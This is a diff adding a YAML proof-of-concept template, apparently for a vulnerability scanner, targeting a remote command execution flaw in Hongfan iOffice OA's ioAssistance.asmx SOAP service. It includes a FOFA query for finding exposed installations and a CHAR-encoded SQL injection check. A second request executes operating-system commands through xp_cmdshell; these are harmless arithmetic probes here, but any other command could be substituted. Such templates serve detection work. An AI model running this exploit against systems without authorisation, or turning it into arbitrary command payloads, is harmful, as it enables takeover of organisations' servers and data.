@@ -1,0 +1,63 @@
+id: poc-yaml-ioffice-ioassistance-rce
+info:
+  name: 红帆OA ioAssistance.asmx 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: iOffice
+  fofa: app="红帆-ioffice"
+variables:
+  t1: random_int(111000,999000)
+  t2: random_int(10,100)
+  t3: t1 - t2
+  command: '"expr "+ str(t1) + " - " + str(t2)
+
+    "cmd.exe /c set /a "+ str(t1) +" - "+ str(t2)
+
+    '
+firstRequest:
+  method: POST
+  path: /ioffice/prg/set/wss/ioAssistance.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+
+    <sql>(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113))</sql>
+
+    </GetLoginedEmpNoReadedInf>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: "status_code == 200 && \ncontains(body,\"qxzpqqxzpqqxzpqqxzpq\")\n"
+requests:
+- method: POST
+  path: /ioffice/prg/set/wss/ioAssistance.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+
+    <sql>exec master.dbo.xp_cmdshell ''{{.command}}''</sql>
+
+    </GetLoginedEmpNoReadedInf>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: "status_code == 200 && \ncontains(body,t3) &&\ncontains(body,\"<Table1\
+    \ diffgr:id=\")\n"
+transport: http
